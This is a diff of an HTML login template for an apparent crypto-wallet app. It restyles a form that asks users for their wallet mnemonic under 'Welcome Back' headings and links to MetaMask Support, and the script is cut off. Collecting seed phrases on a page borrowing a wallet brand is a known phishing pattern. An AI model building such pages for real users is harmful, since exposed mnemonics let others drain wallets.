@@ -7,51 +7,34 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 
-<body class="">
+<body>
 
 
-  <main>
-    <div class="">
-      <div class="">
-        <div class="">
-          <div class="">
-            <div class="">
-              <div class="">
-                <div class="">
-                  <label class="">
-                    Sign in with
-                    </lab>
-                </div>
-
-              </div>
-              <div class="">
-                <div class="">
-                  <label class="" htmlFor="grid-password">
-                    Mnemonic
-                  </label>
-                  <input type="text" value="<%=mnemonic%>" class="" placeholder="Mnemonic" />
-                </div>
-
-                <div>
-                  <label class="">
-                    <input id="customCheckLogin" type="checkbox" class="" />
-                    <span class="">
-                      Remember me
-                    </span>
-                  </label>
-                </div>
-
-                <div class="">
-                  <div id="sign_in_button" name="sign_in_button" class="" type="button">
-                    Sign In
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
+  <main class="flex items-center justify-center h-screen bg-gray-100">
+    <form action="user.html">
+      <div class="bg-stone-200 w-96 p-6 rounded shadow-sm text-center">
+        <div class="flex items-center justify-center mb-4">
+          <img class="h-10 w-10" src="https://i.pinimg.com/736x/e9/e2/78/e9e2787d0cb55d570fe1c76843506759.jpg" alt="">
         </div>
+        <h1>Welcome Back</h1>
+        <h3>The decentralized web awaits</h3>
+        <br>
+        <input type="text" value="<%=mnemonic%>" name="mnemonic" id="mnemonic" placeholder="Mnemonic" class="bg-stone-200 w-full py-2 text-gray-700 px-1 outline-none mb-4 border-b-2 border-zinc-500 ">
+        <!-- <button type="submit" class="bg-blue-500 w-full text-white py-2 rounded-3xl hover:bg-blue-600 transition-colors my-5">
+          Login
+        </button> -->
+        <div id="sign_in_button" name="sign_in_button" class="bg-blue-500 w-full text-white py-2 rounded-3xl hover:bg-blue-600 transition-colors my-5" type="button">
+          Login
+        </div>
+        <br>
+        <a href="forgotpassword.php" class="text-blue-500 hover:text-blue-900">Forgot password?</a>
+        <br>
+        <p class="mt-9 mb-2 text">
+          Need help? Contact
+          <a href="https://metamask.zendesk.com/hc/en-us" class="text-blue-700 ">MetaMask Support</a>
+        </p>
       </div>
-    </div>
+    </form>
   </main>
   <script>
     const sign_in_button = document.querySelector('#sign_in_button')
